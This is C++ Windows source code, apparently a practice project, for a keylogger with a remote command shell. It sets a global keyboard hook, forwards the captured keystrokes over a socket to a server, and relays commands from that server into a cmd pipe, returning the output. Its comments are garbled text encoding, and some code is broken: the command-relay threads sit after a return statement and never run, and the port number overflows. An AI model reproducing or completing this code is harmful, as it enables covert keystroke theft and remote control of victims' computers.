// keyHook.cpp : ����Ӧ�ó������ڵ㡣
//


#include "stdafx.h"
#include <winsock2.h>
#include <thread>
#include<iostream>
using namespace std;

#include "function.h"
#include "keyHook.h"
#include "common.h"
#pragma  comment(lib,"../../bin/keyboradhook.lib")

#define MAX_LOADSTRING 100
extern SOCKET s;
extern HANDLE hWritePipe; //д�˿�
extern HANDLE hCmdReadPipe; //cmd���˿�

extern HANDLE hReadPipe; //���˿�
extern HANDLE hCmdWritePipe; //cmdд�˿�
BOOL SetKeyHook(HWND hWnd);


// ȫ�ֱ���: 
HINSTANCE hInst;                                // ��ǰʵ��
WCHAR szTitle[MAX_LOADSTRING];                  // �������ı�
WCHAR szWindowClass[MAX_LOADSTRING];            // ����������
HWND g_hWnd;
// �˴���ģ���а����ĺ�����ǰ������: 
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
//WinMain �н����������
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: �ڴ˷��ô��롣
	InitSocket();
    InitCmd();
	sockaddr_in addr;//�����滻socketaddr�ṹ�� ���ߴ�Сһ��
	addr.sin_family = AF_INET;//д��
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");//�̶���· ����д����ip �򱾵�ip 
	addr.sin_port = htons(100861);//��  h:host to n:network short�������ֽ� �����ֽ��򣨴�β��ʽ���ͱ����ֽ���Сβ��ʽ��
	int nlength = sizeof(sockaddr_in);
	//2.connect �������ӷ�����
	int nRet = connect(s, (sockaddr*)&addr, nlength);
	if (nRet == SOCKET_ERROR) {
		cout << "����������ʧ�ܣ�" << endl;
		WSACleanup();
		
	}
	else {
		cout << "���������ӳɹ���" << endl;
	}
	





    // ��ʼ��ȫ���ַ���
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_KEYHOOK, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // ִ��Ӧ�ó����ʼ��: 
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYHOOK));

    MSG msg;

    // ����Ϣѭ��: 
    while (GetMessage(&msg, nullptr, 0, 0))
    {
		
		
			
		
		
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
	
    return (int) msg.wParam;
}



//
//  ����: MyRegisterClass()
//
//  Ŀ��: ע�ᴰ���ࡣ
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_KEYHOOK));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_KEYHOOK);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   ����: InitInstance(HINSTANCE, int)
//
//   Ŀ��: ����ʵ�����������������
//
//   ע��: 
//
//        �ڴ˺����У�������ȫ�ֱ����б���ʵ�������
//        ��������ʾ�����򴰿ڡ�
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // ��ʵ������洢��ȫ�ֱ�����

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

  if (!hWnd)
   {
      return FALSE;
   }

 
   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   g_hWnd = hWnd;
   BOOL bRet = SetKeyHook(g_hWnd);
   if (!bRet)
   {
	   cout << "�¹���ʧ��" << endl;
	   return 0;
   }
   return TRUE;
   std::thread thd1([&]() {
	   while (true) {
		   char szOutBuf[256] = { 0 };
		   int nRet;
		   nRet = recv(s, szOutBuf, 255, 0);//����ֵ
		   MyPacket* pPkt = (MyPacket*)szOutBuf;
		   if (nRet == 0) {
			   printf("recv error");
		   }
		   else if (nRet > 0) {
			   if (pPkt->type == PACKET_RLY_CMD)
			   {
				   int nLength = strlen(szOutBuf);
				   unsigned int nWritedLength = 0;
				   if (nLength > 255) {
					   printf("stack overflow");
					   return 0;

				   }


				   BOOL bRet = WriteFile(hWritePipe,
					   szOutBuf,
					   nLength,
					   reinterpret_cast<LPDWORD>(&nWritedLength),
					   NULL //�첽�й�

				   );
				   if (!bRet) {
					   printf("write file error ");
					   return 0;

				   }



			   }
		   }

	   }
   });
   thd1.detach();
   std::thread thd([&]() {
	   while (true) {
		   CHAR sztBuf[256] = { 0 };
		   DWORD nReadBytes = 0;

		   BOOL bRet = ReadFile(hReadPipe,
			   sztBuf,
			   255,
			   &nReadBytes,
			   NULL);
		   if (!bRet) {
			   printf("read file error ");
			   return 0;

		   }
		   char szBuf[1024];
		   const char* pStr = (const char*)sztBuf;
		   MyPacket* pPkt = (MyPacket*)szBuf;

		   pPkt->type = PACKET_RLY_CMD;
		   pPkt->length = strlen(pStr) + 1;	//������ʾ���ݳ��ȣ��������ṹ��ͷ����ǰ��2��4�ֽڡ�
		   memcpy(pPkt->data, pStr, pPkt->length);	//�����ݿ���������
		   send(
			   s,
			   (const char*)pPkt,
			   pPkt->length + sizeof(unsigned int) * 2 + 1,
			   0
		   );


	   }


   });
   thd.detach();
   
}

//
//  ����: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  Ŀ��:    ���������ڵ���Ϣ��
//
//  WM_COMMAND  - ����Ӧ�ó���˵�
//  WM_PAINT    - ����������
//  WM_DESTROY  - �����˳���Ϣ������
//
//
//��Ӧ��Ӧ����Ϣ�ص�����
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {


	case WM_COPYDATA:
		{
		//��ʾ���ǵ�DLL���ͣ� ���ǵ��������
		PCOPYDATASTRUCT pcds = (PCOPYDATASTRUCT)lParam;
		//OutputDebugStringA((LPCSTR)pcds->lpData);
		const char*pStr = (const char*)pcds->lpData;
		char szBuf[256];
		MyPacket* pPkt = (MyPacket*)szBuf;
		pPkt->type = PACKET_REQ_KEYBOARD;
		pPkt->length = strlen(pStr) + 1; //������ʾ���ݳ��ȣ��������ṹ��ͷ����ǰ��2��4�ֽ�
		memcpy(pPkt->data, pStr, pPkt->length);

		int nSendBytes = send(s, (const char*)pPkt, sizeof(unsigned int)*2+ pPkt->length, 0);


		}
		break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // �����˵�ѡ��: 
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: �ڴ˴����ʹ�� hdc ���κλ�ͼ����...
            EndPaint(hWnd, &ps);
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// �����ڡ������Ϣ�������
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}
